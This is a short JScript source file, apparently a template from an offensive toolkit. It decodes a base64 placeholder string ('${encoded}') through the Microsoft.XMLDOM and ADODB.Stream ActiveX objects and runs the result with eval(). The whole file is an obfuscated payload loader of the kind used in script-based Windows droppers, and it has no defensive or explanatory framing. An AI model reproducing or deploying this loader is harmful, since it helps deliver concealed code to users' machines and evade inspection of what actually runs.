var myScript = "${encoded}";
var decoded = decodeBase64(myScript);
eval(decoded);

function BytesToStr(byteArray) {
	var result;
	var adoStream = new ActiveXObject("ADODB.Stream");
        
	adoStream.Type = 1 // adTypeBinary
	adoStream.Open();
	adoStream.Write(byteArray);
	
	adoStream.Position = 0
	adoStream.Type = 2 // adTypeText
	adoStream.CharSet = "utf-8";
	result = adoStream.ReadText();
	adoStream.close();
    return result;
}

function decodeBase64(base64) {
	var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
 	var docElement = xmlDom.createElement("tmp");
	docElement.dataType = "bin.base64";
	docElement.text = base64;
	return BytesToStr(docElement.nodeTypedValue);
}
